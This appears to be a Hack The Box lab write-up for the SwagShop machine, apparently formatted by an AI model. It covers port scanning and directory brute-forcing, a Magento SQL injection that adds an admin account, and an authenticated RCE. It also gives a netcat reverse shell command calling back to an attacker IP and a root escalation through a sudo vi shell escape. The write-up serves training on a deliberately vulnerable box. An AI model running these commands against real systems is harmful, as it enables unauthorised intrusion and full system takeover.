# 🧢 HTB: SwagShop
[Done](Done)
## 📌 Box Info
- Platform [HTB](HTB)
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- **Initial Access**: Magento authentication bypass + RCE
- **Privilege Escalation**: `sudo vi` file escape

---

## 🔍 Recon

### 🔎 Full Port Scan
```bash
nmap -sT -p- --min-rate 10000 -oA shagshop_basic 10.10.10.140
```

### 🔎 Script & Version Scan
```bash
nmap -sCV -p 80,22 -oA swagshop_scv 10.10.10.140
```

---

## 📂 Web Enumeration

### 🔍 Directory Brute Force
```bash
gobuster dir -u http://10.10.10.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php
```

---

## 🐚 Shell as www-data

### 👤 Add Admin via [Shoplift Exploit](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)
```bash
python poc.py 10.10.10.140
# Result: ypwq:123 added as admin
```

### 🔓 Login to Admin Panel
Navigate to:
```
http://10.10.10.140/index.php/admin
```

### 🧪 RCE #1 – PHP Object Injection

#### 📦 Retrieve Magento Install Date
```bash
curl -s http://10.10.10.140/app/etc/local.xml | grep date
```

#### 💣 Download Authenticated RCE Exploit
```bash
searchsploit -m exploits/php/webapps/37811.py
mv 37811.py magento_rce.py
```

#### ⚙️ Configure Exploit
Edit `magento_rce.py`:
```python
username = 'ypwq'
password = '123'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'
```

#### ▶️ Execute Command
```bash
python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
```

## ⚡ Get Reverse Shell

### 🧬 Reverse Shell Payload
```bash
python magento_rce.py 'http://swagshop.htb/index.php/admin' \
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f"
```

### 📡 Catch Shell
```bash
nc -lnvp 9001
```

---

## 🔼 Privilege Escalation (www-data → root)

### 📟 Upgrade Shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo
fg
reset
# Enter: screen
export TERM=screen
```

### 🔍 Check Sudo Permissions
```bash
sudo -l
```

> Output:
```
(root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

---

## 👑 Root Access

### 📖 Read Flag via `vi`
```bash
sudo /usr/bin/vi /var/www/html/../../../root/root.txt
```

### 🐚 Get Root Shell via vi
```bash
sudo /usr/bin/vi /var/www/html/a

# Inside vi:
:set shell=/bin/bash
:shell
```

Or run directly from command line:
```bash
sudo vi /var/www/html/a -c ':!/bin/sh'
```

---

Let me know if you'd like this saved as a reusable template or combined with your other write-ups!